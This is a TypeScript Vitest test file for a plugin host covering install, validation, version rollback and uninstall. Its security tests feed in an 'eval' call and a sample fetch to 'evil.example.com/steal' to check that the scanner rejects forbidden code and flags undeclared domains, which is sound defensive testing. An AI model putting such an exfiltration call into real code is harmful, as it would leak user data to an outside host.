import { describe, expect, it, beforeEach, afterEach } from 'vitest'
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { PluginHost } from './pluginHost'
import type { ParsedBundleFile } from './bundleParser'

function appPlugin(overrides: Partial<Record<string, unknown>> = {}): ParsedBundleFile[] {
  const manifest = {
    id: 'photo-viewer',
    name: 'Photo Viewer',
    version: '1.0.0',
    icon: 'image',
    kind: 'app',
    entry: 'index.html',
    permissions: [{ type: 'storage' }],
    ...overrides
  }
  return [
    { path: 'manifest.json', content: JSON.stringify(manifest) },
    { path: 'index.html', content: '<html><body>hi</body></html>' },
    { path: 'main.js', content: 'console.log("ok")' }
  ]
}

function webPlugin(): ParsedBundleFile[] {
  const manifest = {
    id: 'notion-embed',
    name: 'Notion',
    version: '1.0.0',
    icon: 'note',
    kind: 'web',
    url: 'https://notion.so',
    permissions: [{ type: 'network', domains: ['notion.so'] }]
  }
  return [{ path: 'manifest.json', content: JSON.stringify(manifest) }]
}

describe('PluginHost', () => {
  let dir: string
  let host: PluginHost

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'brighterm-plugins-test-'))
    host = new PluginHost(dir)
  })

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true })
  })

  it('starts with an empty list', () => {
    expect(host.list()).toEqual([])
  })

  it('installs a valid app plugin and writes its files to disk', () => {
    const result = host.install(appPlugin())
    expect(result.ok).toBe(true)
    expect(result.manifest?.id).toBe('photo-viewer')

    const list = host.list()
    expect(list).toHaveLength(1)
    expect(list[0].manifest.name).toBe('Photo Viewer')
    expect(list[0].enabled).toBe(true)

    const written = readFileSync(join(dir, 'photo-viewer', '1.0.0', 'index.html'), 'utf-8')
    expect(written).toContain('hi')
  })

  it('installs a valid web plugin (no entry file required)', () => {
    const result = host.install(webPlugin())
    expect(result.ok).toBe(true)
    expect(host.list()).toHaveLength(1)
  })

  it('returns the requested permissions with the manifest (for the UI to list), not as a warning', () => {
    const result = host.install(appPlugin())
    expect(result.manifest?.permissions).toEqual([{ type: 'storage' }])
    expect(result.warnings).toEqual([])
  })

  it('rejects a plugin with an invalid manifest without writing anything', () => {
    const files: ParsedBundleFile[] = [{ path: 'manifest.json', content: JSON.stringify({ id: 'Bad ID!' }) }]
    const result = host.install(files)
    expect(result.ok).toBe(false)
    expect(host.list()).toEqual([])
    expect(existsSync(join(dir, 'Bad ID!'))).toBe(false)
  })

  it('rejects an app plugin whose entry file is missing', () => {
    const files = appPlugin().filter((f) => f.path !== 'index.html')
    const result = host.install(files)
    expect(result.ok).toBe(false)
    expect(result.errors.some((e) => e.message.includes('index.html'))).toBe(true)
  })

  it('rejects code containing forbidden patterns', () => {
    const files = appPlugin()
    const mainJs = files.find((f) => f.path === 'main.js')!
    mainJs.content = 'eval("2+2")'
    const result = host.install(files)
    expect(result.ok).toBe(false)
    expect(result.errors.some((e) => e.message.includes('eval'))).toBe(true)
    expect(host.list()).toEqual([])
  })

  it('warns about network calls to domains not declared in the manifest', () => {
    const files = appPlugin()
    const mainJs = files.find((f) => f.path === 'main.js')!
    mainJs.content = 'fetch("https://evil.example.com/steal")'
    const result = host.install(files)
    expect(result.ok).toBe(true) // undeclared domains are a warning, not a hard rejection
    expect(result.warnings.some((w) => w.message.includes('evil.example.com'))).toBe(true)
  })

  it('validate() performs every check without writing to disk', () => {
    const result = host.validate(appPlugin())
    expect(result.ok).toBe(true)
    expect(host.list()).toEqual([])
    expect(existsSync(join(dir, 'photo-viewer'))).toBe(false)
  })

  it('can disable and re-enable an installed plugin', () => {
    host.install(appPlugin())
    host.setEnabled('photo-viewer', false)
    expect(host.list()[0].enabled).toBe(false)
    host.setEnabled('photo-viewer', true)
    expect(host.list()[0].enabled).toBe(true)
  })

  it('installing a new version keeps the old version on disk and switches current', () => {
    host.install(appPlugin())
    host.install(appPlugin({ version: '1.1.0' }))

    const list = host.list()
    expect(list).toHaveLength(1)
    expect(list[0].manifest.version).toBe('1.1.0')
    expect(list[0].versions.sort()).toEqual(['1.0.0', '1.1.0'])
    expect(existsSync(join(dir, 'photo-viewer', '1.0.0', 'manifest.json'))).toBe(true)
    expect(existsSync(join(dir, 'photo-viewer', '1.1.0', 'manifest.json'))).toBe(true)
  })

  it('rollback switches the current version back to an earlier one', () => {
    host.install(appPlugin())
    host.install(appPlugin({ version: '1.1.0' }))
    const rolledBack = host.rollback('photo-viewer', '1.0.0')
    expect(rolledBack).toBe(true)
    expect(host.list()[0].manifest.version).toBe('1.0.0')
  })

  it('rollback fails for a version that was never installed', () => {
    host.install(appPlugin())
    expect(host.rollback('photo-viewer', '9.9.9')).toBe(false)
  })

  it('preserves the enabled flag across a reinstall/upgrade', () => {
    host.install(appPlugin())
    host.setEnabled('photo-viewer', false)
    host.install(appPlugin({ version: '1.1.0' }))
    expect(host.list()[0].enabled).toBe(false)
  })

  it('uninstall removes the plugin from the list and from disk', () => {
    host.install(appPlugin())
    host.uninstall('photo-viewer')
    expect(host.list()).toEqual([])
    expect(existsSync(join(dir, 'photo-viewer'))).toBe(false)
  })

  it('a fresh PluginHost pointed at the same directory sees previously installed plugins', () => {
    host.install(appPlugin())
    const reopened = new PluginHost(dir)
    expect(reopened.list()).toHaveLength(1)
  })
})
